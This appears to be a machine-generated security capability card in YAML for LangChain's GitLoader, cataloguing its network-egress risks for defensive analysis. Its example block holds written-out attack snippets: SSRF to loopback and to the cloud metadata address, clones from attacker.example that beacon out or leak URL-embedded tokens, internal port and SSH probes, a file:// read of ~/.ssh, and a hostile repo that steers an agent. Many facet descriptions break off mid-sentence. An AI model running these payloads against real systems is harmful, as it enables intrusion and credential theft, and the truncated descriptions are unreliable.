# GitLoader

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-49ed9212f6072415
api: GitLoader
api_family: langchain.GitLoader
runtime:
  language: python
  ecosystem: python-runtime
  package: langchain
  version: legacy-source-bound
capability_class: network-egress
normative_authority: capability-facts-only
bound_sinks:
- GitLoader(clone_url=..., repo_path=..., ...)
- GitLoader(branch=..., repo_path=..., ...)
- GitLoader(file_filter=..., clone_url=..., ...)
roles:
- role_id: destination-url
  description: Legacy controlled role destination-url.
  bindings:
  - expression: url
    caller_bindable: true
facets:
- facet_id: legacy-facet-f966ce94
  capability: Clone an arbitrary Git repository from an attacker-controlled URL into a local
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-11552730
  capability: 'The `clone_url` parameter accepts any Git transport protocol:'
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-d677a010
  capability: 'SSRF — target internal / RFC 1918 addresses via any of the above transports:'
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-9e3a9768
  capability: 'Reach cloud-instance metadata services via HTTP(S) git clone to link-local addresses:'
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-e13d1734
  capability: HTTP redirect following by git's transport layer — if the clone URL points to a
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-e431db3a
  capability: Recursive submodule cloning — by default `GitLoader` does NOT pass `--recursive`,
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-6e28c0b7
  capability: Information leakage from the cloned repository — all files matching the
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-9ce69b6b
  capability: Callback beacon — the act of cloning from `https://attacker.example/repo.git`
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-e92f3029
  capability: Token / credential theft via URL embedding — git accepts credentials in the URL
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-bc94cf6d
  capability: Arbitrary local directory creation — the clone target directory is derived from
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-8e33aae0
  capability: Arbitrary port targeting — git://, http://, https://, and ssh:// transports all
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-ec4b01e5
  capability: DNS-rebinding / TOCTOU — the hostname in `clone_url` is resolved to an IP at
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-5637cb15
  capability: Repository size DoS — an attacker can point `clone_url` at an extremely large
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-b6780a17
  capability: Deep-clone memory exhaustion — the loaded files are all returned in memory as
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-44713b3f
  role_id: null
  value: '`branch` defaults to the repository''s default branch (usually `main` or `master`)'
  security_effect: '`branch` defaults to the repository''s default branch (usually `main` or `master`)'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-a0bab0b7
  role_id: null
  value: '`file_filter` defaults to loading ALL files from the cloned repository (excluding'
  security_effect: '`file_filter` defaults to loading ALL files from the cloned repository (excluding'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-7c57ca3f
  role_id: null
  value: '`repo_path` defaults to `None`, which means GitLoader creates a temporary'
  security_effect: '`repo_path` defaults to `None`, which means GitLoader creates a temporary'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-43072b49
  role_id: null
  value: 'Git''s own defaults apply: HTTP redirects are followed (git uses libcurl which'
  security_effect: 'Git''s own defaults apply: HTTP redirects are followed (git uses libcurl which'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-244d2ebf
  role_id: null
  value: SSH-based clones use the server's SSH agent (`SSH_AUTH_SOCK`) and any loaded keys
  security_effect: SSH-based clones use the server's SSH agent (`SSH_AUTH_SOCK`) and any loaded keys
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-b78cd372
  role_id: null
  value: Git's `GIT_SSL_NO_VERIFY` environment variable, if set, disables TLS certificate
  security_effect: Git's `GIT_SSL_NO_VERIFY` environment variable, if set, disables TLS certificate
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-db12533a
  role_id: null
  value: Git's `http.proxy` / `https.proxy` config or `HTTP_PROXY` / `HTTPS_PROXY`
  security_effect: Git's `http.proxy` / `https.proxy` config or `HTTP_PROXY` / `HTTPS_PROXY`
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-c5d2e70b
  role_id: null
  value: The git clone process inherits the caller's full environment — any
  security_effect: The git clone process inherits the caller's full environment — any
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-0213793c
  role_id: null
  value: '`GitLoader.__init__` spawns `git clone` as an external subprocess (via'
  security_effect: '`GitLoader.__init__` spawns `git clone` as an external subprocess (via'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: "from langchain_community.document_loaders import GitLoader\n\n# Clone a public documentation repo and load its markdown files\nloader = GitLoader(\n    clone_url=\"https://github.com/langchain-ai/langchain.git\",\n    repo_path=\"./tmp/langchain-repo\",\n    branch=\"master\",\n    file_filter=lambda file_path: file_path.endswith(\".md\"),\n)\ndocuments = loader.load()\nfor doc in documents[:3]:\n    print(doc.metadata[\"source\"], len(doc.page_content))\n"
  capability_edge: "from langchain_community.document_loaders import GitLoader\n\n# 1. SSRF — clone from an internal-only service via loopback\nloader = GitLoader(\n    clone_url=\"http://127.0.0.1:8080/admin-repo.git\",\n    repo_path=\"./tmp/pwned\",\n)\ndocs = loader.load()  # TCP connect to localhost:8080; if a git repo is served, its files leak\nprint(f\"Leaked {len(docs)} files from internal service\")\n\n# 2. Cloud metadata SSRF via direct HTTP clone to 169.254.169.254\nloader = GitLoader(\n    clone_url=\"http://169.254.169.254/latest/meta-data/\",\n    repo_path=\"./tmp/metadata-leak\",\n)\ntry:\n    docs = loader.load()\nexcept Exception as e:\n    # Even on error, git issued an HTTP GET to the metadata endpoint;\n    # the error message may echo the metadata response\n    print(f\"Metadata endpoint contacted; error: {e}\")\n\n# 3. SSRF via redirect chain to internal host\nloader = GitLoader(\n    clone_url=\"https://attacker-controlled.example/redirect?target=http://169.254.169.254/latest/meta-data/\"\
    ,\n    repo_path=\"./tmp/redirect-leak\",\n)\ntry:\n    docs = loader.load()\nexcept Exception as e:\n    print(f\"Redirect SSRF completed; response in error: {e}\")\n\n# 4. Callback beacon — clone from attacker's own server, exfiltrate server identity\nloader = GitLoader(\n    clone_url=\"https://attacker.example/beacon-repo.git\",\n    repo_path=\"./tmp/beacon\",\n)\ndocs = loader.load()\n# Server's IP, git User-Agent, and any URL-embedded credentials sent to attacker.example\n\n# 5. Credential-stuffed URL — credentials sent to attacker's server\nloader = GitLoader(\n    clone_url=\"https://ghp_fakeToken123@attacker.example/private-repo.git\",\n    repo_path=\"./tmp/stolen-creds\",\n)\ndocs = loader.load()\n# The fake token is sent in the HTTP Authorization header to attacker.example\n\n# 6. Arbitrary internal port probe over git:// protocol\nloader = GitLoader(\n    clone_url=\"git://10.0.0.5:6379/repo\",\n    repo_path=\"./tmp/port-probe\",\n)\ntry:\n    docs = loader.load()  # TCP\
    \ SYN to internal Redis port\nexcept Exception as e:\n    print(f\"Port probe result: {type(e).__name__}\")\n\n# 7. SSH to internal host — uses server's SSH keys\nloader = GitLoader(\n    clone_url=\"ssh://git@10.0.0.100/production/config-repo.git\",\n    repo_path=\"./tmp/ssh-pivot\",\n)\ndocs = loader.load()\n# If the server has an SSH key authorized on 10.0.0.100, clone succeeds\n# and all files from the internal repo are returned\n\n# 8. File:// scheme — read local repos (or any local directory git can parse)\nloader = GitLoader(\n    clone_url=\"file:///home/user/.ssh\",\n    repo_path=\"./tmp/local-leak\",\n)\ntry:\n    docs = loader.load()  # git attempts to clone a local path\nexcept Exception as e:\n    print(f\"Local file access attempt: {e}\")\n\n# 9. Exfiltrate environment data via repo content — prepare a repo whose\n#    loaded content triggers further actions in the agent calling GitLoader\nloader = GitLoader(\n    clone_url=\"https://attacker.example/payload-repo.git\"\
    ,\n    repo_path=\"./tmp/payload-repo\",\n)\ndocs = loader.load()\n# All files from the attacker's repo are now LangChain Documents in memory;\n# the agent that called GitLoader sees the content and may act on it\n"
provenance:
- LangChain GitLoader source — langchain_community.document_loaders.git (GitLoader.__init__, GitLoader.load)
- 'Git documentation — git-clone transport protocols (https://git-scm.com/docs/git-clone#URLS): HTTP(S), git://, ssh://, file://, local paths'
- Git documentation — git-clone --recursive and submodule behavior (https://git-scm.com/docs/git-clone#Documentation/git-clone.txt---recursive)
- Git documentation — GIT_SSL_NO_VERIFY, http.proxy, credential helpers (https://git-scm.com/docs/git-config)
- 'Git documentation — gitcredentials: credential embedding in URLs (https://git-scm.com/docs/gitcredentials)'
- OWASP Server-Side Request Forgery Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- 'CWE-918: Server-Side Request Forgery (SSRF) — https://cwe.mitre.org/data/definitions/918.html'
- AWS IMDSv1 metadata endpoint — https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
- GCP metadata endpoint — https://cloud.google.com/compute/docs/metadata/overview
```
